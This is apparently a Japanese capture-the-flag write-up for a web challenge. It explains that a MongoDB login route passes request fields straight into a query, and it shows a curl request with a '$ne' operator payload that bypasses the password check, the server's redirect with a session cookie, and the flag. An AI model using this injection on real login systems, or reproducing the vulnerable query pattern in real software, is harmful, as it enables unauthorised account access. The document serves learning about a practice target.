# NoSQL:Web:224pts
NoSQLを使ったサイトを作ってみました。ログイン後に`/`にアクセスすると秘密のページを見ることができます。  
[https://nosql.web.wanictf.org/](https://nosql.web.wanictf.org/)  
[web-nosql.zip](web-nosql.zip)  

# Solution
アクセスするとログインフォームがある。  
NoSQL Challenge  
[site.png](site/site.png)  
適当にログイン試行してみるが、失敗する。  
ソースコードが配布されているので、それを読むと`app/routes/login.js`でMongoDBよりユーザを取得している。  
```JavaScript
~~~
    await client.connect();
    const user = await client.db("nosql").collection("users").findOne({
      username: req.body.username,
      password: req.body.password,
    });
    if (!user) {
      throw "error";
    }
~~~
```
オブジェクトを渡せる典型的な脆弱性があるので`{"$ne":"Satoki"}`などでパスワードがSatokiでないユーザでログインできる。  
```bash
$ curl https://nosql.web.wanictf.org/login --data '{"username":"admin","password":{"$ne":"Satoki"}}' -H "Content-type: application/json" -v
~~~
< HTTP/2 302
< content-type: text/plain; charset=utf-8
< date: Sat, 06 Nov 2021 11:01:22 GMT
< location: /
< set-cookie: connect.sid=s%3AqYGleLocAVbTqSODMmPPxow1z4wTVIs7.vabFzQ8Z8PEfAkYoJM3cw9CWsjwLmH7wyDBhH0nYItY; Path=/; HttpOnly
< vary: Accept
< x-powered-by: Express
< content-length: 23
<
* Connection #0 to host nosql.web.wanictf.org left intact
Found. Redirecting to /
```
ログイン後のクッキーで`/`にアクセスするとflagが表示された。  
flag  
[flag.png](site/flag.png)  

## FLAG{n0_sql_1nj3ction} 